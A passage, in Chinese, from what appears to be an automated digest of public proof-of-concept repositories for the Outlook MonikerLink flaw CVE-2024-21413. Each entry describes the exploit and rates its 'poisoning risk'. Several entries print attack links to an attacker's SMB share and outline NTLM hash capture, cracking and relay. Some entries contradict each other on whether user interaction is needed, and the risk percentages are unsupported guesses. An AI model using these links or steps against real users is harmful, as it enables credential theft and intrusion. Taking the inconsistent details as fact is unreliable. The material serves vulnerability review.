提供的代码包含SMTP和POP3服务器的Python脚本，以及利用漏洞的exploit脚本。仔细检查这些脚本，未发现明显的恶意代码。但是，使用第三方提供的exploit脚本始终存在风险，因为攻击者可能在其中植入恶意代码。经过分析，投毒风险评估为10%。主要风险点在于对第三方脚本的信任。

**总结：**

CVE-2024-21413是一个严重的Outlook RCE漏洞，攻击者可以通过诱使用户点击恶意链接来利用该漏洞。提供的POC代码主要用于演示NTLM哈希泄露，而非完整的RCE。在使用任何第三方提供的漏洞利用代码时，都需要谨慎评估其安全性。

**项目地址:** [PolarisXSec/CVE-2024-21413](https://github.com/PolarisXSec/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #10

**来源**: [CVE-2024-21413-Redfox-Secuirty_Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape.md](../2024/CVE-2024-21413-Redfox-Secuirty_Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019，Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 无需用户交互，攻击者可以通过发送特制的电子邮件来触发漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 "MonikerLink" 漏洞。根据漏洞库信息和搜索结果，该漏洞是由于不正确的输入验证导致的。攻击者可以通过构造包含恶意链接的电子邮件，在用户未进行任何交互的情况下，远程执行代码。提供的漏洞利用代码 `README.md` 文件内容仅包含标题，无法判断其有效性。根据Github信息判断，存在可利用的POC。由于 `README.md` 文件过于简单，且未发现任何可疑代码，因此判定存在投毒代码的可能性为 0%。利用方式为，攻击者构造包含恶意 MonikerLink 的电子邮件，当 Outlook 处理该邮件时，漏洞被触发，从而允许攻击者执行任意代码。

**项目地址:** [Redfox-Secuirty/Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape](https://github.com/Redfox-Secuirty/Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #11

**来源**: [CVE-2024-21413-ShubhamKanhere307_CVE-2024-21413.md](../2024/CVE-2024-21413-ShubhamKanhere307_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，CVSS评分9.8，允许远程代码执行

**影响版本:** 受影响版本包括但不限于：Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019 (版本低于https://aka.ms/OfficeSecurityReleases)，Microsoft 365 Apps for Enterprise (版本低于 https://aka.ms/OfficeSecurityReleases)，Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 攻击者需要诱骗受害者点击包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，也被称为"MonikerLink" bug。该漏洞源于不正确的输入验证。攻击者可以通过发送特制的电子邮件，诱使用户点击其中的恶意链接，从而在用户系统上执行任意代码。

**有效性分析：**

提供的POC代码尝试利用该漏洞。它创建一封包含HTML链接的电子邮件，该链接指向一个`file://` URL。 此URL试图访问远程SMB共享，从而可能导致NTLM凭据泄露或远程代码执行，这取决于服务器的配置和Outlook的漏洞利用机制。

**投毒风险分析：**

提供的`Exploit.py`脚本主要功能是发送电子邮件。代码中没有发现明显的恶意或隐藏的投毒代码。该脚本会获取发件人的Outlook电子邮件地址和密码，以及收件人的电子邮件地址和邮件主题。脚本允许用户选择是否添加链接附件。 如果选择添加，则会添加指向指定IP地址（例子中为`file://///192.168.0.103/test!exploit`）的链接，否则添加用户自定义的邮件正文。该脚本使用`smtplib`库连接到Outlook的SMTP服务器（`smtp-mail.outlook.com`），并发送电子邮件。 没有发现任何会将用户凭据泄露给第三方的行为。

**漏洞利用方式分析：**

该漏洞利用方式依赖于`file://`协议处理中的缺陷。当Outlook处理包含指向SMB共享的`file://`链接的电子邮件时，它可能会尝试自动访问该共享，从而可能泄露用户的NTLM凭据或允许攻击者执行任意代码。 该PoC 通过构造包含恶意链接的HTML电子邮件来尝试利用此漏洞。 攻击者诱使用户点击此链接，从而触发漏洞。

总而言之，POC代码尝试通过`file://`协议利用Outlook的漏洞来实现远程代码执行，虽然该POC本身没有明显的投毒代码，但成功利用依赖于目标的网络配置和安全设置。

**项目地址:** [ShubhamKanhere307/CVE-2024-21413](https://github.com/ShubhamKanhere307/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #12

**来源**: [CVE-2024-21413-ThemeHackers_CVE-2024-21413.md](../2024/CVE-2024-21413-ThemeHackers_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 严重，攻击者无需用户交互即可在目标系统上执行任意代码。

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 攻击者需要能够向受害者发送电子邮件。

**POC 可用性:** 是

**投毒风险:** 30%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也称为“MonikerLink”漏洞。根据漏洞库信息和搜索引擎结果显示，该漏洞允许攻击者在受害者的计算机上执行任意代码，而无需任何用户交互。这个漏洞是由于对输入验证不当造成的(CWE-20)。

**利用方式：**

1.  攻击者创建一个特制的电子邮件，其中包含恶意的链接或嵌入的内容。
2.  当受害者收到并打开此电子邮件时，Outlook 会尝试解析该链接。
3.  由于漏洞存在于 Outlook 的链接处理机制中，攻击者可以利用此漏洞绕过安全检查，从而执行任意代码。

**POC代码分析：**

提供的POC代码是一个Python脚本，用于发送包含HTML内容的电子邮件。该脚本从 `config.ini` 文件中读取发件人邮箱地址、密码、SMTP服务器和端口。然后它使用模板 `template/Stripo.html` 构造电子邮件的内容，并将收件人的邮箱地址和链接内容插入到HTML代码中。最后，该脚本使用smtplib库发送电子邮件。

**有效性评估：**

根据搜索引擎的结果 (特别是github链接: ThemeHackers/CVE-2024-21413) 和漏洞描述, 此POC是可用的,可以用于漏洞验证的.

**投毒风险分析：**

代码中存在一定的投毒风险，主要体现在以下几个方面：

*   **config.ini文件：** POC依赖于 `config.ini` 文件,需要用户配置邮箱账户和密码。 如果恶意攻击者提供了一个修改后的 `config.ini` 文件，其中包含错误的SMTP配置或恶意代码，可能导致用户的信息泄露或者执行未知的操作。
*   **template/Stripo.html模板：** HTML模板允许插入任意HTML代码，如果攻击者篡改了HTML模板, 就可以嵌入恶意的JavaScript或其他类型的脚本，在用户打开邮件时执行。
*   **依赖的外部库:** colorama, bgtask, configparser， 攻击者可能修改这些依赖，在用户本地执行恶意命令

总体而言，该POC的投毒风险大约为30%。 这个评估是基于对代码的分析以及对潜在攻击向量的理解。需要注意的是，具体的风险程度取决于攻击者的能力和目标用户的安全意识。

**项目地址:** [ThemeHackers/CVE-2024-21413](https://github.com/ThemeHackers/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #13

**来源**: [CVE-2024-21413-X-Projetion_CVE-2024-21413-Microsoft-Outlook-RCE-Exploit.md](../2024/CVE-2024-21413-X-Projetion_CVE-2024-21413-Microsoft-Outlook-RCE-Exploit.md)

## CVE-2024-21413-Microsoft-Outlook-RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，无需用户交互即可远程执行任意代码

**影响版本:** 受影响版本包括 Microsoft Office 2016、2019、LTSC 2021 和 Microsoft 365 Apps for Enterprise，具体版本请参考CVE详情。

**利用条件:** 攻击者需要通过发送特制的电子邮件给受害者。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2024-21413 漏洞，又名 MonikerLink bug，是一个 Microsoft Outlook 远程代码执行漏洞。攻击者可以通过发送包含恶意链接的电子邮件，在受害者未进行任何交互的情况下执行任意代码。该漏洞的根本原因是 Outlook 在处理 Moniker 链接时存在不当的输入验证。攻击者可以利用此漏洞绕过 Outlook 的安全策略，执行恶意代码。

**有效性：**
从提供的搜索引擎结果和漏洞库信息来看，该漏洞是一个已知的、高危的远程代码执行漏洞，并且有公开的 PoC 代码可用。参考链接 [https://github.com/ThemeHackers/CVE-2024-21413](https://github.com/ThemeHackers/CVE-2024-21413)。因此，提供的 PoC 代码很可能有效。

**投毒风险：**
提供的 PoC 代码包含一个 `exp.sh` 脚本和一个 README.md 文件。
*   `exp.sh` 脚本：该脚本的功能是发送包含恶意链接的电子邮件。其中包含 display_banner函数，send_email函数。`send_email`函数用于发送包含base64编码图片的HTML邮件，邮件内容包含一个URL。从代码本身来看，没有明显的恶意代码或后门，但存在潜在的风险：
    *   该脚本依赖于外部 SMTP 服务器，如果攻击者控制了 SMTP 服务器，可以篡改邮件内容。
    *   base64_image_string 变量中，包含一个PNG图片的Base64编码。攻击者可能会伪造图片内容，嵌入恶意代码，或者使用其他手段达到攻击的目的。
    *   link_url 变量，攻击者可以插入恶意链接，诱导用户点击。
    *   从经验判断，该漏洞的PoC更可能存在于精心构造的link_url, base64_image_string，或者其他的HTML代码片段中，通过某种方式绕过Outlook的安全检查，最终实现RCE，因此存在一定的投毒风险，但直接在exp.sh脚本里投毒的可能性较低。

    考虑到脚本的复杂性，且存在多种潜在的攻击方式，因此认为存在20%的投毒风险。

**利用方式：**
1.  攻击者准备好恶意的`link_url`和`base64_image_string`等变量内容。
2.  攻击者配置`exp.sh` 脚本，指定 SMTP 服务器、端口、用户名、密码、发件人邮箱、收件人邮箱和恶意链接。
3.  攻击者运行 `exp.sh` 脚本，向受害者发送包含恶意链接的电子邮件。
4.  受害者打开电子邮件，Outlook 处理邮件内容时，由于 MonikerLink 漏洞，恶意代码在受害者机器上执行。

综上所述，CVE-2024-21413 是一个高危的远程代码执行漏洞，利用方式简单，但需要精心构造恶意链接和邮件内容才能成功利用，同时要警惕PoC 代码中可能存在的投毒风险。

**项目地址:** [X-Projetion/CVE-2024-21413-Microsoft-Outlook-RCE-Exploit](https://github.com/X-Projetion/CVE-2024-21413-Microsoft-Outlook-RCE-Exploit)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #14

**来源**: [CVE-2024-21413-ahmetkarakayaoffical_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-ahmetkarakayaoffical_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413-Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 严重，允许攻击者在目标机器上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016, 2019, LTSC 2021, Microsoft 365 Apps for Enterprise等，具体版本范围参考漏洞库信息。

**利用条件:** 攻击者需要诱使用户打开包含恶意链接或内容的邮件。无需用户交互（zero-click NTLM leak）或仅需单次点击（one-click RCE）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，也被称为“MonikerLink”漏洞。根据漏洞库信息和搜索结果，此漏洞允许攻击者通过构造特殊的链接，在受害者无需交互或仅需极少交互的情况下，执行任意代码。利用方式主要有两种：

1.  **Zero-click NTLM Leak:** 攻击者可以诱使受害者打开包含恶意链接的邮件，该链接会触发NTLM凭据泄露，而无需受害者进行任何点击操作。
2.  **One-click RCE:** 攻击者可以诱使受害者点击邮件中的恶意链接，从而实现远程代码执行。

POC代码提供了一个Python脚本，该脚本利用SMTP认证发送包含恶意URL的电子邮件，模拟实际攻击场景。脚本需要SMTP服务器地址、端口、用户名、密码、发送者和接收者邮箱地址、恶意URL以及邮件主题等参数。

关于投毒风险，虽然POC代码本身旨在演示漏洞利用，但考虑到网络安全威胁的复杂性，以及攻击者可能对公开代码进行修改和传播，存在一定的投毒风险。例如，攻击者可能在POC代码中添加额外的恶意代码，用于窃取用户凭据或执行其他恶意操作。虽然提供的POC代码看起来比较简单，主要功能是发送包含恶意链接的邮件，但无法完全排除作者或其他人修改该代码并添加后门或恶意功能的可能性。因此，评估投毒风险为10%。使用前务必仔细审查代码，并在隔离环境中进行测试。

**请务必注意：**  该漏洞已在野外被利用，并已被CISA添加到已知被利用的漏洞目录中。强烈建议用户尽快安装Microsoft提供的安全更新。

**项目地址:** [ahmetkarakayaoffical/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/ahmetkarakayaoffical/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #15

**来源**: [CVE-2024-21413-dshabani96_CVE-2024-21413.md](../2024/CVE-2024-21413-dshabani96_CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和系统权限获取

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021等。

**利用条件:** 攻击者需要诱使用户打开包含恶意链接或文件的电子邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为“MonikerLink”漏洞。攻击者可以利用此漏洞在受害者的计算机上执行任意代码，无需用户交互。

**有效性：**根据漏洞信息和搜索结果，此漏洞是一个零日漏洞，已被积极利用。POC 代码旨在利用此漏洞。但是,提供的POC 代码只是发送电子邮件的框架，需要配置 SMTP 服务器，用户名密码等信息，并且需要 SMB 服务器来捕获 NTLM hash，成功利用的可能性取决于环境配置和目标用户行为。

**投毒风险：** 代码主要功能是发送包含恶意链接的电子邮件，并启动 SMB 服务器捕获 NTLM hash。虽然代码包含发送邮件和捕获 NTLM hash的功能，但潜在的风险包括：
1.  **恶意HTML模板：** HTML模板可能包含恶意脚本，例如 JavaScript，如果用户打开邮件并允许执行脚本，可能导致客户端漏洞或信息泄露。
2.  **SMB服务器钓鱼：** 启动的 SMB 服务器可能被用于钓鱼，例如，捕获用户的 NTLM 哈希后尝试破解，或者利用捕获的凭据访问其他服务。
3. **依赖外部服务:** 依赖 SMTP 服务和 SMB 服务, 这些服务本身可能存在安全隐患.
整体投毒风险较低，约为10%，主要集中在HTML模板和配置是否含有恶意代码。

**利用方式：**
1.  攻击者构造包含恶意链接的电子邮件。
2.  受害者打开电子邮件并点击恶意链接。
3.  恶意链接利用 Outlook 的 MonikerLink 漏洞，在受害者计算机上执行任意代码，或者泄露NTLM Hash。
4. 攻击者启动 SMB 服务器，诱导 Outlook 客户端连接，捕获受害者的 NTLM 哈希。
5. 攻击者可以使用捕获的 NTLM 哈希进行进一步攻击，例如传递哈希攻击。

**项目地址:** [dshabani96/CVE-2024-21413](https://github.com/dshabani96/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #16

**来源**: [CVE-2024-21413-duy-31_CVE-2024-21413.md](../2024/CVE-2024-21413-duy-31_CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，无需用户交互即可远程执行代码

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)、Microsoft Office 2019、Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 需要目标用户使用受影响的Outlook版本，并预览或点击包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞，也称为 "MonikerLink" 漏洞。攻击者可以通过构造包含恶意 `file://` 链接的电子邮件，诱使用户点击或预览该邮件，从而在目标系统上执行任意代码。根据POC代码，攻击者可以使用一个 Expect 脚本发送特制的电子邮件，该邮件包含一个指向远程SMB服务器的 `file://` 链接。当 Outlook 处理此链接时，它会尝试连接到远程服务器，从而泄露用户的 NTLM 哈希值。如果攻击者能够破解哈希值或利用 NTLM 中继攻击，他们就可以获得对系统的访问权限。此外，此漏洞可以与CVE-2023-21716链接以达到远程代码执行的目的。

**有效性：**
提供的POC代码似乎有效，因为它演示了如何利用 `file://` 协议发送包含恶意链接的电子邮件。从漏洞信息和搜索引擎结果来看，该漏洞已经被积极利用。CISA 将其添加到已知被利用的漏洞列表中，表明该漏洞在现实世界中具有很高的威胁。

**投毒风险：**
虽然提供的代码主要目的是演示漏洞利用过程，但存在一些潜在的投毒风险。 Expect脚本本身没有明显的后门,主要利用了telnet发送恶意邮件. 但是，考虑到以下几点，风险评估为10%：
1.  **对外部依赖的信任：** 该脚本依赖于 `expect` 工具，如果该工具被篡改，则可能引入恶意行为。
2.  **脚本执行环境：** 该脚本的执行环境可能存在安全漏洞，攻击者可以利用这些漏洞来执行恶意代码。
3.  **社会工程学：** 攻击者可能会修改脚本以使其更具欺骗性，例如伪造发件人地址或使用更具吸引力的主题行，从而提高攻击成功率。

**利用方式：**
1.  攻击者设置一个 SMB 服务器来监听传入的连接。
2.  攻击者使用提供的 `cve-2024-21413.sh` 脚本生成包含恶意 `file://` 链接的电子邮件。
3.  攻击者将该电子邮件发送给目标用户。
4.  当目标用户在受影响的 Outlook 版本中预览或点击该邮件中的链接时，Outlook 会尝试连接到攻击者的 SMB 服务器。
5.  此连接会导致用户的 NTLM 哈希值被发送到攻击者的服务器。
6.  攻击者可以使用破解工具（如 Hashcat）破解哈希值，或者利用 NTLM 中继攻击来获得对目标系统的访问权限。
7. 攻击者可以将此漏洞与 CVE-2023-21716 结合使用，以实现远程代码执行。


**项目地址:** [duy-31/CVE-2024-21413](https://github.com/duy-31/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #17

**来源**: [CVE-2024-21413-gurleen-147_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC.md](../2024/CVE-2024-21413-gurleen-147_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (在指定版本范围内)

**利用条件:** 受害者需要点击攻击者发送的包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞。根据提供的漏洞利用代码（exploit.py），攻击者通过发送特制的 HTML 邮件，诱骗受害者点击邮件中的 `file://ATTACKER_IP/test!exploit` 链接。此链接利用 MonikerLink 绕过安全警告，从而可能导致任意代码执行。POC 代码本身未发现隐藏的恶意代码，因此投毒风险较低。利用方式是，攻击者需要搭建一个 SMB 服务器，当受害者点击链接时，Outlook 尝试访问该 SMB 服务器上的共享资源，攻击者可以利用这一过程执行恶意代码。漏洞库信息也验证了这是一个高危漏洞，且已经被CISA添加到已知被利用漏洞列表中(KEV)。

**项目地址:** [gurleen-147/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC](https://github.com/gurleen-147/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #18

**来源**: [CVE-2024-21413-hau2212_Moniker-Link-CVE-2024-21413-.md](../2024/CVE-2024-21413-hau2212_Moniker-Link-CVE-2024-21413-.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行，完全控制受害者系统

**影响版本:** 受影响版本包括Microsoft Office 2016, 2019, LTSC 2021以及Microsoft 365 Apps for Enterprise的特定版本。具体版本范围请参考漏洞库信息。

**利用条件:** 需要受害者打开包含恶意链接的邮件

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，利用方式是诱骗用户点击邮件中的`file://`链接。根据提供的漏洞利用代码，攻击者需要设置攻击机IP地址和邮件服务器地址，然后发送包含特定HTML内容的邮件。HTML内容包含一个`file://ATTACKER_MACHINE/test!exploit`链接，当用户点击此链接时，Outlook会尝试访问攻击者机器上的指定路径，如果攻击者在相应路径放置了恶意文件，就可以实现远程代码执行。从代码本身看，没有发现明显的投毒代码。代码的目的是构建包含恶意链接的HTML邮件并发送出去。该漏洞的有效性依赖于目标系统是否受到补丁保护以及攻击者是否能够成功搭建恶意文件服务器。由于CISA已经将此漏洞添加到已知被利用漏洞列表中，并且存在可用的POC，因此利用的有效性较高。攻击者需要控制一个服务器，并在服务器上放置恶意的payload，并通过构造恶意的file://链接诱导用户点击。

**分析：**

1.  **有效性：**根据提供的POC代码和漏洞库信息，该漏洞是有效的。CISA将其添加到已知被利用漏洞列表中，说明该漏洞已被实际利用。提供的POC代码可以用于生成包含恶意链接的电子邮件。
2.  **投毒风险：**经过对POC代码的分析，没有发现明显的投毒代码。代码的功能明确，就是生成并发送包含恶意链接的电子邮件，并没有额外恶意行为。
3.  **利用方式：**
    *   攻击者构建一个包含恶意`file://`链接的HTML邮件。
    *   攻击者将邮件发送给目标用户。
    *   目标用户打开邮件并点击恶意链接。
    *   Outlook尝试访问攻击者控制的服务器上的恶意文件。
    *   如果攻击者在服务器上放置了恶意payload，且Outlook执行该payload，则实现远程代码执行。

**漏洞缓解措施：**

*   及时安装Microsoft官方发布的补丁。
*   谨慎点击邮件中的链接，特别是来自未知发件人的邮件。
*   配置Outlook的安全设置，限制对`file://`协议的使用。


**项目地址:** [hau2212/Moniker-Link-CVE-2024-21413-](https://github.com/hau2212/Moniker-Link-CVE-2024-21413-)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #19

**来源**: [CVE-2024-21413-olebris_CVE-2024-21413.md](../2024/CVE-2024-21413-olebris_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook 远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在受害者机器上执行任意代码。

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 aka.ms/OfficeSecurityReleases 中指示的版本).

**利用条件:** 攻击者需要诱使用户打开特制的电子邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一项 Microsoft Outlook 远程代码执行漏洞，也称为“MonikerLink”漏洞。攻击者可以通过发送特制的电子邮件来利用此漏洞，受害者无需进行任何用户交互即可触发。从搜索引擎结果和漏洞库信息来看，该漏洞影响多个版本的Microsoft Outlook。提供的PoC代码是一个Python脚本，用于发送包含恶意链接的电子邮件。脚本构造了一个包含纯文本和HTML部分的电子邮件，其中HTML部分可能包含利用该漏洞的恶意链接。投毒风险评估：代码本身除了常规的邮件发送功能外，在image_base64变量中发现一段疑似图片base64编码的字符串, 但该字符串过长, 不排除其中含有恶意代码的可能性, 因此判断存在一定的投毒风险，概率估计为10%。利用方式：攻击者首先搭建SMTP服务器，然后使用此脚本构造包含恶意URL的电子邮件，并将其发送给目标用户。当目标用户打开电子邮件时，Outlook将尝试加载恶意URL，导致代码执行。

**项目地址:** [olebris/CVE-2024-21413](https://github.com/olebris/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #20

**来源**: [CVE-2024-21413-r00tb1t_CVE-2024-21413-POC.md](../2024/CVE-2024-21413-r00tb1t_CVE-2024-21413-POC.md)

## CVE-2024-21413 - Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，无需用户交互即可远程执行代码，可能导致完全控制受影响的系统。

**影响版本:** Microsoft Office 2016版本 < 16.0.5435.1001, Microsoft Office 2019版本 < https://aka.ms/OfficeSecurityReleases, Microsoft 365 Apps for Enterprise版本 < https://aka.ms/OfficeSecurityReleases, Microsoft Office LTSC 2021版本 < https://aka.ms/OfficeSecurityReleases

**利用条件:** 攻击者需要知道受害者的邮箱地址，并能够通过SMTP发送邮件。受害者需要点击邮件中的恶意链接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413，也被称为“MonikerLink”漏洞，是一个存在于Microsoft Outlook中的零日漏洞。此漏洞允许攻击者通过发送特制的电子邮件在受害者计算机上执行任意代码，而无需任何用户交互。根据描述，利用方式是：攻击者发送包含恶意链接的电子邮件，当用户点击链接时，Outlook会尝试访问链接指向的`file:///` URL，导致执行攻击者控制的代码。提供的POC代码模拟了发送包含恶意链接的电子邮件的过程。该链接指向攻击者控制的SMB共享，当Outlook尝试访问此共享时，受害者的NTLM哈希会被发送到攻击者处。利用此漏洞通常需要用户点击邮件中的链接。关于投毒风险，虽然POC代码本身实现了漏洞利用，但是README中指示要运行`impacket-smbserver` ，并且提供了进一步利用CVE-2023-21716的思路，结合免责声明可以判断，作者主观上没有进行恶意投毒行为，但是客观上如果使用者继续利用可能会进行恶意投毒攻击，因此存在一定的投毒风险，概率约为10%。漏洞库信息和搜索引擎结果均证实了该漏洞的存在和严重性，以及其远程代码执行的性质。

**项目地址:** [r00tb1t/CVE-2024-21413-POC](https://github.com/r00tb1t/CVE-2024-21413-POC)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #21

**来源**: [CVE-2024-21413-th3Hellion_CVE-2024-21413.md](../2024/CVE-2024-21413-th3Hellion_CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook Remote Code Execution

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021，直到aka.ms/OfficeSecurityReleases上发布的修复版本。

**利用条件:** 需要受害者打开包含恶意链接的电子邮件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-21413，也被称为“MonikerLink”漏洞，是 Microsoft Outlook 中的一个远程代码执行漏洞。攻击者可以通过发送特制的电子邮件，诱导受害者点击其中的恶意链接，从而在受害者系统上执行任意代码。

**有效性分析：**
根据漏洞库信息和搜索引擎结果，此漏洞是真实存在的，并且已经被积极利用。提供的POC代码尝试通过发送包含`file://`协议URL的电子邮件，来触发漏洞。这种方法利用了Outlook处理`file://`链接时的不当输入验证。

**投毒风险分析：**
检查提供的Python脚本和README文件，没有发现明显的恶意代码或后门。脚本的主要功能是构建和发送包含恶意链接的电子邮件。风险主要在于：

*   **脚本可能被修改：**  攻击者可能修改该脚本，例如更改默认的IP地址，添加额外的payload等，用以进行更隐蔽或更具破坏性的攻击。
*   **依赖项风险：**  脚本依赖于`smtplib`库，理论上，该库本身也可能存在潜在的安全问题，但这种可能性较低。
*   **密码泄露风险：** 使用脚本时，发送者的电子邮件密码会以明文形式传递，存在泄露的风险。
*  **接收者打开邮件和点击链接:** 接收者需要打开邮件，并且点击邮件中的链接才会触发，一定程度上限制了利用成功率

因此，将该POC代码本身视为投毒的概率较低，大约为5%。

**利用方式分析：**
1.  **攻击者准备：**
    *   攻击者需要一个SMTP服务器来发送电子邮件。
    *   攻击者需要一个可访问的服务器，并监听特定的端口，以便在受害者点击链接后接收连接。
2.  **漏洞利用：**
    *   攻击者使用POC脚本，指定发送者、接收者、SMTP服务器和攻击者监听的IP地址。
    *   脚本构建包含`file://{args.ip}/` URL的电子邮件，并将其发送给受害者。
3.  **受害者交互：**
    *   受害者打开电子邮件，并点击其中的链接。
